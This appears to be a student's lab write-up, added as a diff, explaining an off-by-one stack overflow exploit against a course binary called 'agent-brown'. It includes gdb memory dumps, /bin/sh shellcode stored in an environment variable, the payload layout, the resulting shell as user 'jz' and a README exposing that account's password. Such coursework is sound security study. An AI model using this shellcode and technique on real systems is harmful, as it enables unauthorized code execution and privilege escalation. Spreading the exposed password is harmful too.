@@ -1,0 +1,79 @@
+In Question 4, the vulnerability is in the invoke function. The buf has only space for 64 Bytes, but there is 1 extra Byte (at line 9, i <= 65) 
+which we can write up to 65 Bytes including my shell-code into the buf . Even though I can't overwrite the return address, but I can overwrite 
+only 1 Byte of SFP which point back to somewhere between the buf and the return address, and it can jump to where my shell-code is (egg)
+
+This is how I do it:
+_First: run "invoke -d agent-brown"
+break at line 19 (in invoke, before go into flip function) to find out about eip --> 0x804844d
+and input "AAAAAAAAAAAAAAAAAAAAAAA" by running "r "AAAAAAAAAAAAAAAAAAAAAAA""
+
+Breakpoint 1 at 0x804841d: file agent-brown.c, line 19.
+(gdb) r "AAAAAAAAAAAAAAAAAAAAAAA"
+Starting program: /home/brown/agent-brown "AAAAAAAAAAAAAAAAAAAAAAA"
+
+Breakpoint 1, invoke (in=0xbffff883 'A' <repeats 23 times>) at agent-brown.c:19
+19	  flip(buf, in);
+(gdb) info frame
+Stack level 0, frame at 0xbffff6b0:
+ eip = 0x804841d in invoke (agent-brown.c:19); saved eip 0x804844d
+ called by frame at 0xbffff6c0
+ source language c.
+ Arglist at 0xbffff6a8, args: in=0xbffff883 'A' <repeats 23 times>
+ Locals at 0xbffff6a8, Previous frame's sp is 0xbffff6b0
+ Saved registers:
+  ebp at 0xbffff6a8, eip at 0xbffff6ac
+
+_Second: I figure out the addres where "egg" variable is, which is also my shell-code:
+(gdb) x/s *((char **) environ+1)
+0xbfffff96:	"egg=\353\037^\211v\b1\300\210F\a\211F\f\260\v\211\363\215N\b\215V\f\315\200\061\333\211\330@\315\200\350\334\377\377\377/bin/sh"  
+
+(gdb) x/32x 0xbfffff9a
+0xbfffff9a:	0x895e1feb	0xc0310876	0x89074688	0x0bb00c46
+0xbfffffaa:	0x4e8df389	0x0c568d08	0xdb3180cd	0xcd40d889
+0xbfffffba:	0xffdce880	0x622fffff	0x732f6e69	0x45540068
+0xbfffffca:	0x733d4d52	0x65657263	0x5750006e	0x682f3d44
+0xbfffffda:	0x2f656d6f	0x776f7262	0x682f006e	0x2f656d6f
+0xbfffffea:	0x776f7262	0x67612f6e	0x2d746e65	0x776f7262
+0xbffffffa:	0x0000006e	Cannot access memory at address 0xbffffffe
+
+
+_Third: I break at line 14 to see my buf. I figure out that there are 68 Bytes between "buf" and "return address". However,I can write upto 65 Bytes into "buf", so and I can overwrite 1 Byte of SFP
+
+(gdb) x/32x buf
+0xbffff668:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbffff678:	0x61616161	0x00616161	0x00000000	0x00000000
+0xbffff688:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff698:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff6a8:	0xbffff6b8	0x0804844d	0xbffff883	0x00000005
+0xbffff6b8:	0xbffff6d8	0x08048487	0xbffff883	0xb7e5f196
+0xbffff6c8:	0xb7fd2000	0xbffff6f0	0xb7fed270	0xbffff6f0
+0xbffff6d8:	0x00000000	0xb7e454d3	0x080484b0	0x00000000
+
+_ Fourth: I want the SFP point to the address of "buf", and execute my shell code 16 Bytes after the address of "buf".Therefore, the value of buf will be the address 4 Bytes of the the address of "buf",and the value of the address after 4 Byte of "buf" is the where my shell-code is.
+
+This is how my "arg" file will print in this order:
+	+ 16 Bytes of "A"
+	+ 16 Bytes. The value of the address of my shell-code (egg) 
+	+ 32 Bytes of "B"
+	+ 1 to overwrite 1 Byte of SFP
+
+_ Fourth: run ./exploit
+After inject the shell code
+(gdb) x/32x buf
+0xbffff608:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbffff618:	0xbfffff9a	0xbfffff9a	0xbfffff9a	0xbfffff9a
+0xbffff628:	0x62626262	0x62626262	0x62626262	0x62626262
+0xbffff638:	0x62626262	0x62626262	0x62626262	0x62626262
+0xbffff648:	0xbffff618	0x0804844d	0xbffff827	0x00000005
+0xbffff658:	0xbffff678	0x08048487	0xbffff827	0xb7e5f196
+0xbffff668:	0xb7fd2000	0xbffff690	0xb7fed270	0xbffff690
+0xbffff678:	0x00000000	0xb7e454d3	0x080484b0	0x00000000
+
+Once inside jz
+$ whoami
+jz
+$ cat README
+Perhaps we are asking the wrong questions.
+
+user: jz
+pass: @Y((K9Br
